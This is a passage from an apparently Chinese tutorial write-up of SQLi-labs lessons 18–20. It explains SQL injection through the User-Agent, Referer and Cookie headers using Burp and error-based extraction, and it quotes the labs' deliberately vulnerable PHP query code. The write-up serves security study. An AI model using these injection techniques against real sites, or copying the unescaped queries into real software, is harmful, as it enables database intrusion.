size=&quot;3&quot;&gt;&#x27;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; &#125;?&gt; 可以看到这里对输入的uname和passwd参数用check_input()做了严格的过滤，不太能注入，然而它直接将Http头中的user agent不加过滤的作为INSERT INTO语句的值，这就为我们注入提供了可能：我们可以burp抓包送到repeater模块，修改请求头的User-Agent字段，如下：构造上图中的包，可以看到回显如下：这里依旧用Lesson 5中提到的xmlupdate报错注入，构造如下的User-Agent头：可以在回显中看到xmlupdate的报错：剩下的就和Lesson 5相同了，不再赘述 Lesson 19打开实例，输入账号密码看一下回显：发现返回了HTTP头中referer字段的值，关于referer字段的作用，我在下面记录一下：referer字段用来提供访问来源的信息，当用户在地址栏输入网址或从标签页打开网址时，就不会发送referer字段，而在下面三种场景中会发送： 用户单击网页链接 用户发送表单 网页加载静态资源，如图片、脚本、样式在这三种场景下，浏览器会将当前网址作为referer字段放在请求头里并发送。回到题目，首先burp抓包送到repeater：可以看到这里的referer字段就是Lesson19网页的URL，尝试修改一下：报错：根据报错构造如下payload，依旧使用基于xmlupdate()的报错注入：其余同Lesson 18，不再赘述Lesson 20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)登录后显示如下界面：实际上这里显示的逻辑是：登录成功后前端又带着cookie使用基于GET方法请求了index页面，这一点从抓到的包可以看出来：这里是提交后POST包和它的响应包，可以看到这里的状态码是302，直接将页面重定向到了index.php，实际上这个返回页面看起来是这样的：只是快速重定向到了index.php，重定向发送了一个GET包，内容如下：可以看到其中包含了cookie信息，尝试注入：爆出错误信息：构造payload：爆出数据库名剩下的就和Lesson 5一样了，不再赘述 源码1234567$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) &#123; die(&#x27;Issue with your mysql: &#x27; . mysql_error()); &#125; $row = mysql_fetch_array($result);","categories":[],"tags":[]}],"categories":[],"tags":[]}